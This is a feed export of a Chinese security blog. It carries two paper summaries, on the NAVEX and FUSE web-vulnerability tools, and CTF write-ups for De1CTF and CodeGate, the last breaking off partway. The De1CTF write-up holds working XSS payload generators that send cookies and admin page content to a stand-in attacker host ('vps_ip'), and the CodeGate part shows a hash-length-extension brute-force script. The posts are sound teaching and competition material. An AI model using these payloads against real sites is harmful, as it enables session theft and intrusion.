alt=""><br>运行结束后，程序会返回路径集，即从攻击者可控变量source($_GET、$_POST等)到潜在漏洞函数调用之间的变量传递。<br>值得一提的是，作者这里不仅仅使用了PDG的后向分析，同时其为了发掘逻辑上的漏洞，也会进行正向寻找。<br>然后作者会将提取出的约束放入Z3求解器进行约束求解。以备后续生成exp使用。<br>待上述操作结束后，程序进入动态分析，或者称为前端约束生成阶段。在这一步中，作者使用爬虫，爬取html页面中的信息和属性名，例如提取form表单或者js的相关约束：<br><img src="/images/2020-03-25-10-00-34.png" alt=""><br>然后同样会使用约束器求解，得到满足的input，并进行输入，但由于可能input也会受到后端的约束，因此为了防止爬虫由于未能正确input，不能到达下一步，作者对后端进行了监控，以探测在input后，后端是否会发生变化，例如进行数据库查询，或者改变了当前状态，例如全局变量的赋值(session，cookie等)，或者新产生了变量等。以此断定爬虫的前段约束后得到的input是否生效，如果未生效，其会同时考虑后端约束，并再次求解，而后继续监控往复，直到成功input。<br>如我们最开始的例子中，此时会考虑到后端的约束，即$publisher的长度问题：<br><img src="/images/2020-03-25-10-08-45.png" alt=""><br>同时作者也考虑过了角色问题，在web网站中，通常会分为管理员和普通用户，那么为了最大的代码覆盖率，作者会存储管理员用户的登录凭证，以方便探测到管理员用户可能存在的潜在漏洞。<br>为了存储这些关系，作者定义了Navigation Graph，其为有向图：G = (N , E )，它的边代表了下一步跳转的意义，例如下图：<br><img src="/images/2020-03-25-18-15-32.png" alt=""><br>在我们第一步达到selectBooks.php后，在html模拟用户input，会来到下一个url操作：selectBooks.php?action=borrow，而这2个node之间则会产生一条edge，又前者指向后者。<br>同时对于每一个Node，其拥有一些属性，例如id为每一个node的唯一标识符，url为当前node的链接，form_params为表单的input，role存放管理员用户的登录凭证。<br>如此一来，在找到漏洞点后，作者即可找到一条可到达，并触发该漏洞函数的链接，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://localhost/App/index.php</span><br><span class="line">2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]</span><br><span class="line">3. http://localhost/App/selectBooks.php?action =borrow</span><br><span class="line">4. http://localhost/App/hold.php</span><br><span class="line">5. http://localhost/App/hold.php?step=checkout</span><br><span class="line">6. http://localhost/App/hold.php?step=checkout &amp;msg=&lt;script&gt;alert(”XSS”);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>最终成功将exp带入到6条语句，成功进行xss攻击。</p><h2 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h2><p>作者对26个php cms进行了测试，php文件数量超过22.7k，列表如下：<br><img src="/images/2020-03-25-18-21-01.png" alt=""><br>对于sql注入，作者只关心了如下4种潜在的漏洞函数：mssql query, mysql query, mysqli query和sqlite query，并通过实验测试发现，在不到1小时的时间内，工具生成了105个sql注入exp：<br><img src="/images/2020-03-25-18-24-27.png" alt=""><br>可以看到在获得的结果里，均为true positives，以此显现了 NAVEX的高精度和高效率。<br>同样的，对于XSS和逻辑漏洞，在较短的时间内，都有不错的表现：<br><img src="/images/2020-03-25-18-25-24.png" alt=""><br><img src="/images/2020-03-25-18-25-38.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章的思路较为新颖，由于其动静态结合的方式，不仅可以一定程度上增加效率，并且能够有效的探测到一些普通静态分析工具不能检测出的漏洞。其贡献不仅在于学术上的创新，对我们cms审计也提供了不少的便利。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次介绍的是一篇发表在安全顶会2018 USENIX Security的paper，文章旨在自动化挖掘web漏洞，同时生成对应的exp，其比
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>2020 De1CTF &amp; Animal Crossing</title>
    <link href="http://skysec.top/2020/05/03/2020%20De1CTF%20&amp;%20Animal%20Crossing/"/>
    <id>http://skysec.top/2020/05/03/2020 De1CTF &amp; Animal Crossing/</id>
    <published>2020-05-03T02:23:34.000Z</published>
    <updated>2020-06-21T09:53:44.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>五一的时候参与了一下De1CTF，里面有一道题让我印象很深刻：Animal Crossing。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题干描述如下：<br><img src="/images/2020-05-06-20-18-20.png" alt=""><br>可能作者很喜欢玩动森），进去之后是一个如下页面：<br><img src="/images/2020-05-06-20-18-42.png" alt=""><br>我们随机输入一些字符串后，来到下一页：<br><img src="/images/2020-05-06-20-19-10.png" alt=""><br>此时我们的url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=vcwevcw</span><br></pre></td></tr></table></figure></p><p>我们随机更改，页面会相应变化，同时发现有admin report界面：<br><img src="/images/2020-05-06-20-19-41.png" alt=""><br>那么很明显了，这应该是一个xss打管理员cookie的题目。<br>尝试fuzz了一下各个参数，发现攻击点应该在data参数上，但其过滤了大量的字符，并且设有csp,导致常规的xss做法并不适用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;;object-src &apos;none&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-05-06-20-20-45.png" alt=""></p><h2 id="原型链构造"><a href="#原型链构造" class="headerlink" title="原型链构造"></a>原型链构造</h2><p><img src="/images/2020-05-06-20-21-26.png" alt=""><br>发现我们的代码会被拼接在此处进行执行，那么首先进行闭合：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=%27||1111//</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-05-06-20-22-16.png" alt=""><br>那么如何利用1111部分的代码，让我们达到执行任意代码的目的呢？<br>这里就和一些trick有关，我们看一个例子：<br><img src="/images/2020-05-06-20-25-44.png" alt=""><br>可以看到，对于toString，其会将其他值以字符串形式表示，特别的，对于对象，其会转换为[object Object]，而对于数组，其会转换为Array.join(‘,’)的形式进行拼接。但是对于valueOf( )，其返回的则是自身。<br>那我们再看一个例子：<br><img src="/images/2020-05-06-20-31-27.png" alt=""><br>在一元加操作符操作对象的时候，会先调用对象的valueOf方法来转换，如此一来，我们可以利用这一特点，进行函数构造执行代码。那么我们回到题目中：<br><img src="/images/2020-05-06-20-34-39.png" alt=""><br>如此一来，我们就可以定义function内容：<br><img src="/images/2020-05-06-20-35-06.png" alt=""><br>那么我们再搭配上valueOf：<br><img src="/images/2020-05-06-20-36-55.png" alt=""><br>当然，代码中没有+1的操作，那么怎么触发valueOf呢？其实很简单：<br><img src="/images/2020-05-06-20-40-04.png" alt=""><br>如此一来，我们即可进行任意代码执行。</p><h2 id="xss打cookie"><a href="#xss打cookie" class="headerlink" title="xss打cookie"></a>xss打cookie</h2><p>在可执行任意代码后，我们下一步就是进行location跳转打cookie:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=<span class="string">'http://vps_ip?flag='</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure></p><p>但是由于题目设置了较为恶心的waf，所以我们这里选择利用atob编码绕过：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">location='http://vps_ip?flag='+document.cookie</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p><p>编写代码如上，以用于自动生成exp。<br>攻击后即可得到管理员cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure></p><h2 id="xss打管理员页面"><a href="#xss打管理员页面" class="headerlink" title="xss打管理员页面"></a>xss打管理员页面</h2><p>但很显然只有一半flag是不行的，于是想到读一下管理员页面信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=&apos;http://vps_ip?flag=&apos;+btoa(document.body.innerHTML)</span><br></pre></td></tr></table></figure></p><p>得到信息解码后如下：<br><img src="/images/2020-05-06-20-45-08.png" alt=""><br>可以发现管理员界面有无数张图片= =，猜想flag要么是其中一张，要么是拼接所有图片得到。那么尝试访问目录访问图片，但发现均为500，无法直接访问。<br>于是这里想到方案有2种：<br>1.利用js截图，将页面带出<br>2.将图片全部传出来<br>在解题中我选择了第二种思路，那么如何把图片传出呢？这里我们发现题目还有一个上传功能，可以让我们上传头像，但是只允许png和jpg后缀，这也是为何我选择了第二种方法，因为后缀名没法bypass（但是后来交流发现，不需要bypass后缀= =，我太菜啦！）<br>那么这里的思路转变为让管理员将图片上传后，再将return的访问url传出到我们的vps，我们即可获取到图片，于是写出如下脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">(async()=&gt;&#123;</span></span><br><span class="line"><span class="string">    const arr = []</span></span><br><span class="line"><span class="string">    for(let i=1;i&lt;=9;i++) &#123;</span></span><br><span class="line"><span class="string">        res = await fetch(`/island/test_$0&#123;i&#125;.png`)</span></span><br><span class="line"><span class="string">        data = await res.blob()</span></span><br><span class="line"><span class="string">        const os = new FormData();</span></span><br><span class="line"><span class="string">        const mf = new File([data], "name.png");</span></span><br><span class="line"><span class="string">        os.append("file", mf);</span></span><br><span class="line"><span class="string">        r = await fetch("/upload", &#123;method: "POST",body: os&#125;)</span></span><br><span class="line"><span class="string">        data = await r.json()</span></span><br><span class="line"><span class="string">        arr.push(data.data)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location="http://vps_ip/?c="+btoa(JSON.stringify(arr))</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p><p>然后将400张图拼在一起，得到后半段flag：<br><img src="/images/2020-05-06-20-51-24.png" alt=""><br>当然这里额外提一下，其实引入js库，不需要bypass js后缀，我们利用如下方式即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(`/static/images/xxxxxx.png`).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</span><br></pre></td></tr></table></figure></p><p>然后引入js库，截图后将图片利用upload上传，再把return url发送到我们服务器即可~</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道xss是我认为De1CTF比较有趣的一道题目了，首先考的就是纯web，其次出题的思路比较好，而不是一味的恶心人= =，点个赞~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;五一的时候参与了一下De1CTF，里面有一道题让我印象很深刻：Animal Crossing。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; FUSE &amp; Finding File Upload Bugs via Penetration Testing</title>
    <link href="http://skysec.top/2020/04/29/Paper%20Summary%20&amp;%20FUSE%20&amp;%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/"/>
    <id>http://skysec.top/2020/04/29/Paper Summary &amp; FUSE &amp; Finding File Upload Bugs via Penetration Testing/</id>
    <published>2020-04-29T02:23:34.000Z</published>
    <updated>2020-06-21T09:54:11.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次介绍的是一篇发表在安全顶会NDSS 2020上的一篇paper，其针对文件上传漏洞的场景，实现了一款动态fuzz的工具FUSE，并利用其发现了现有33个CMS的15 CVE。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先提几个关键的缩写含义，对于漏洞分类上，可以大致为两类，即：<br>UFU：为Unrestricted File Upload的缩写，含义即任意文件上传。<br>UEFU：为Unrestricted Executable File Upload的缩写，含义即任意可执行文件上传。<br>但这两类可能有一个子集的包含关系，UEFU应该为UFU的子集，因为我们上传的文件未必是可执行的。<br>然后是对于上传的恶意文件，我们也可以分为两类：<br>CE：为code execution的缩写，含义即为代码执行。<br>PCE：为potential code execution的缩写，含义即为潜在的任意代码执行。<br>一类就是代码执行的文件，这个非常容易理解，比如我们常见的一句话木马，而潜在代码执行的文件，可以理解成js等，需要引入或者满足一定条件的触发才会让其产生威胁。<br>而至于文件上传漏洞，作为一种危害性大，案例多的web漏洞，应该大家都比较熟悉了。那么其出现漏洞的位置也是多样化的，例如后缀名过滤产生的问题：<br><img src="/images/2020-03-27-10-07-36.png" alt=""><br>我们可以看到黑名单过滤产生了2个弊端：第一是黑名单中的后缀名可能会有遗漏，第二是此处黑名单匹配并未使用大小写通配，从而会导致大小写Bypass。<br>同样的，漏洞也可能会是Content-Type过滤产生的问题：<br><img src="/images/2020-03-27-10-08-11.png" alt=""><br>例如上述代码中，我们看到其会对Content-Type进行过滤，而Content-Type并不能真实反映文件的内容，是可通过burp等抓包工具进行拦截修改的，所以同样会产生安全隐患。<br>那么对于文件上传出现漏洞的多样性，其实对攻击者的探测产生了一些麻烦，我们在黑盒的情况下或者在找到上传点的情况下，可能需要通过大量的猜测和探测才能找到正确的Bypass模式，但实际上很多时候这是一种低效率的行为，有没有可能有一款类似sqlmap的工具，来自动化的fuzz上传接口呢？于是便有了FUSE这款工具。</p><h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>我们首先看一下工具的架构：<br><img src="/images/2020-03-27-10-10-26.png" alt=""><br>那么实际上该工具的重点就在于其如何产生有效的payload和验证payload的攻击是否生效，首先我们先看其如何有效的产生payload：<br><img src="/images/2020-03-27-10-18-13.png" alt=""><br>我们注意到，在一次文件上传的请求里，其实有很多位置是我们可以进行伪造更改的，因此作者将常见的文件上传bypass技巧归纳为如下多种模式：<br><img src="/images/2020-03-27-10-16-35.png" alt=""><br>比如M3更改content-type，M4更改文件名后缀等等，当然我们肯定存在后端检测文件上传时，既检测content-type，又检测文件名后缀的情况，因此作者会对其进行排列组合进行测试：<br><img src="/images/2020-03-27-12-22-53.png" alt=""><br>测试的时候，假如我们选定的seed模式为M1、M2、M3，那么工具会生成如上排列组合的模式，依次进行探测，从第一不修改任何参数进行恶意文件上传，到按照M1M2M3模式修改所有参数进行上传，当然如果其中某一种上传成功，那么自然不会去尝试包含这一种修改的修改，例如：<br><img src="/images/2020-03-27-12-25-50.png" alt=""><br>当M1测试后，如果M1测试成功，我们的恶意文件已上传，那么则不会去尝试M1M3的组合，因为没有意义，其应该一定为成功。<br>当然这里可能涉及到相互冲突的问题，假设M1M3一起修改，可能会有冲突，所以考虑到这样的问题，工具也会进行筛选操作，例如M1和M2一起会产生冲突，那么M1M2和M1M2M3这两种排列组合不会进行组合修改。<br><img src="/images/2020-03-27-12-24-29.png" alt=""><br>了解了payload的生成方式，我们再来看一下如何获取恶意文件上传后的路径，以用于检测是否攻击成功：<br><img src="/images/2020-03-27-10-16-00.png" alt=""><br>工具有相应的config文件，其可以指定上传成功后的路径前缀，或者response里的路径url，以此正则去提取上传后的文件路径。当然作为一种修复文件上传漏洞的方案，常看见到文件名更改和路径的隐藏，上传者无法知道文件传到了何处，其文件名是什么。那么对于这一种情况，作者使用了一个文件监视器：<br><img src="/images/2020-03-27-12-30-26.png" alt=""><br>该监视器运行在攻击目标服务器上，时刻监视该服务器上的文件创建。也是因为这一点，我个人认为FUSE可能更像一款动态fuzz的漏洞发掘工具，而非一款典型的渗透测试工具，因为这一需求我们在渗透测试中是肯定不会满足的，如果都有目标服务器的控制权限了，那么也没必要进行攻击了。所以这款工具的目标，更像去挖掘一些开源现有cms的文件上传漏洞。<br>然后是工具的运行逻辑：<br><img src="/images/2020-03-27-10-16-13.png" alt=""><br>这就比较清晰了，即排列组合上述的payload，然后进行不断的上传测试，通过访问上传后的路径，判断文件是否上传成功。</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>工具的作者关注点在于4种文件：php、html、xhtml、js，故此根据这4种文件，作者进行上传，以测试其是否允许CE或者PCE文件的上传。<br>首先数据集上，作者选取了33个CMS，并找到其中的文件上传点，然后利用工具进行动态fuzz，得到如下结果：<br><img src="/images/2020-03-27-10-16-57.png" alt=""><br>我们从结果里可以看到，其中有9个cms是需要文件监视器的，即上传后的文件路径和文件名难以被攻击者直接获取。同时我们发现PCE中只有php和js，这可能是因为php文件虽然上传成功，但未必能被直接解析，其可能受到.htaccess的影响，而导致其只能是潜在的代码执行文件，可能需要配合任意文件删除漏洞，才能发挥作用。而对于js，其一般是需要被html等调用触发，才能造成一系列的攻击，故其也作为了一种PCE文件。<br>当然除此之外，该工具有测试尝试上传了.htaccess文件，我们知道.htaccess是可以更改apache子目录配置的，其可以指定将jpg后缀按照php进行解析等，很容易导致组合拳形式的bypass，所以对其的测试是很有必要的，我们也可以看到在上述CMS中，有6个CMS是允许.htaccess上传的，这是相当危险的。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>FUSE这款工具我个人认为，其定义应该为文件上传界的sqlmap，但由于其较强的约束条件，可能在实战黑盒测试中作用有限，应对会修改文件名和文件路径，或做隐藏的安全保护，是比较难以突破的。<br>工具开源在：<a href="https://github.com/WSP-LAB/FUSE" target="_blank" rel="noopener">https://github.com/WSP-LAB/FUSE</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次介绍的是一篇发表在安全顶会NDSS 2020上的一篇paper，其针对文件上传漏洞的场景，实现了一款动态fuzz的工具FUSE，并利用其
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>2020 CodeGate Web Writeup</title>
    <link href="http://skysec.top/2020/02/09/2020%20CodeGate%20Web%20Writeup/"/>
    <id>http://skysec.top/2020/02/09/2020 CodeGate Web Writeup/</id>
    <published>2020-02-09T02:23:34.000Z</published>
    <updated>2020-06-21T09:53:27.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>随手尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110.10.147.166/view.php?name=123&amp;p1=456&amp;p2=789</span><br></pre></td></tr></table></figure></p><p>得到如下url:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?sig=43bb08065a4d2217ca3881e93c65276b&amp;q=TVRJeixORFUyLE56ZzU=</span><br></pre></td></tr></table></figure></p><p>不难发现，view.php的功能，是帮助我们把name、p1、p2转化格式后，发送给api.php。<br>其中q的值为：<br><img src="/images/2020-02-09-15-44-51.png" alt=""><br>同时存在一个report功能：<br><img src="/images/2020-02-09-15-47-06.png" alt=""><br>如果把api.php的payload传过去，就能触发XSS，但是考虑到题目有CSP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;none&apos;; base-uri &apos;none&apos;;</span><br></pre></td></tr></table></figure></p><p>显然需要bypass CSP，此时我们关注到api.php的代码实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$apis = explode(<span class="string">"|"</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">","</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">"header"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">":"</span>) !== <span class="keyword">false</span> || strpos($p1.$p2, <span class="string">"-"</span>) !== <span class="keyword">false</span>) <span class="comment">//Don't trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">"$p1: $p2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"cookie"</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"body"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;.*&gt;/"</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;br /&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"hello"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以利用header进行bypass csp，但是需要同时对body传入exp,而view.php只能处理单个元组，不能同时为我们签名header和body：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header,p1(b64),p2(b64)|body,p1(b64),p2(b64) ...</span><br></pre></td></tr></table></figure></p><p>所以我们需要自己根据算法构造sig，考虑到api.php的检测方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">"q"</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">"sig"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">"q"</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">"sig"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"??"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以尝试hash长度拓展攻击，首先我们已有一个元组和签名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=123,p1=456,p2=789</span><br><span class="line">sig=43bb08065a4d2217ca3881e93c65276b</span><br></pre></td></tr></table></figure></p><p>但是我们未知salt的长度，那么需要进行爆破：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_sig = <span class="string">"43bb08065a4d2217ca3881e93c65276b"</span></span><br><span class="line">old_data = <span class="string">"MTIz,NDU2,Nzg5"</span> <span class="comment"># 123 456 789</span></span><br><span class="line">url = <span class="string">"http://110.10.147.166/api.php?sig=%s&amp;q=%s"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    result = hashpumpy.hashpump(old_sig, old_data, <span class="string">"|Nzg5,NDU2,MTIz"</span>, i)  <span class="comment"># 789 456 123</span></span><br><span class="line">    new_sig = result[<span class="number">0</span>]</span><br><span class="line">    new_data = base64.b64encode(result[<span class="number">1</span>])</span><br><span class="line">    now_url = url % (new_sig,new_data)</span><br><span class="line">    r = requests.get(now_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'??'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行可得，salt长度为12。<br>那么此时可以并行构造header和body，但是如何bypass csp呢？<br>由于不擅XSS，赛后请教了一下Melody师傅,得知可用404进行bypass：<br><img src="/images/2020-02-09-16-28-01.png" 